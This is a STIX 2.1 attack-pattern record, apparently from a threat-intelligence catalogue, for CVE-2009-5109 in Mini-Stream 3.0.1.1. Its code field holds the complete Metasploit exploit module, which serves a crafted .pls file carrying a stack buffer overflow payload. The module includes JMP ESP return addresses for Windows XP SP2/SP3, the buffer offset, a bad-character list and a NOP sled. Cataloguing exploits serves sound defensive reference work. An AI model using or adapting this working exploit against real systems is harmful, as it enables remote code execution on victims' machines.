{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f422cadd-f330-4026-a374-af2a8d522d81",
    "created": "2024-08-14T16:45:54.373589Z",
    "modified": "2024-08-14T16:45:54.373593Z",
    "name": "Mini-Stream 3.0.1.1 Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Mini-Stream 3.0.1.1 By creating a specially crafted pls file, an attacker may be able to execute arbitrary code.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/mini_stream.rb",
            "external_id": "mini_stream.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-5109"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Mini-Stream 3.0.1.1 Buffer Overflow',\n      'Description' => %q{\n          This module exploits a stack buffer overflow in Mini-Stream 3.0.1.1\n        By creating a specially crafted pls file, an attacker may be able\n        to execute arbitrary code.\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Unknown', # CORELAN Security Team\n          'Ron Henry <rlh[at]ciphermonk.net>', # dijital1; Return address update\n        ],\n      'References' =>\n        [\n          [ 'CVE', '2009-5109'],\n          [ 'OSVDB', '61341' ],\n          [ 'EDB', '10745' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload' =>\n        {\n          'Space' => 3500,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x26\\x3d\\x2b\\x3f\\x3a\\x3b\\x2d\\x2c\\x2f\\x23\\x2e\\x5c\\x30\",\n          'StackAdjustment' => -3500\n        },\n      'Platform' => 'win',\n      'Targets' =>\n        [\n          [\n            'Windows XP SP3 ENG',\n            {\n              'Ret'    => 0x7e429353,  # 0x7e429353 JMP ESP - USER32.dll\n              'Offset' => 17417\n            }\n          ],\n          [\n            'Windows XP SP2 ENG',\n            {\n              'Ret'    => 0x7c941eed,  # 0x7c941eed JMP ESP - SHELL32.dll\n              'Offset' => 17417\n            }\n          ]\n        ],\n      'Privileged' => false,\n      'DisclosureDate' => '2009-12-25',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('URIPATH',  [ true,  'The URI to use for this exploit', 'msf.pls'])\n      ])\n  end\n\n\n  def on_request_uri(cli, request)\n    # Calculate the correct offset\n    host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    host << \":#{datastore['SRVPORT']}/\"\n    offset = target['Offset'] - host.length\n\n    # Construct our buffer\n    sploit = rand_text_alpha(offset)\n    sploit << [target.ret].pack('V')\n    sploit << make_nops(32)\n    sploit << @p\n\n    print_status(\"Sending malicous payload\")\n    send_response(cli, sploit, {'Content-Type'=>'application/pls+xml'})\n  end\n\n  def exploit\n    @p = payload.encoded\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-12-25",
    "x_mitre_platforms": [
        "win'"
    ]
}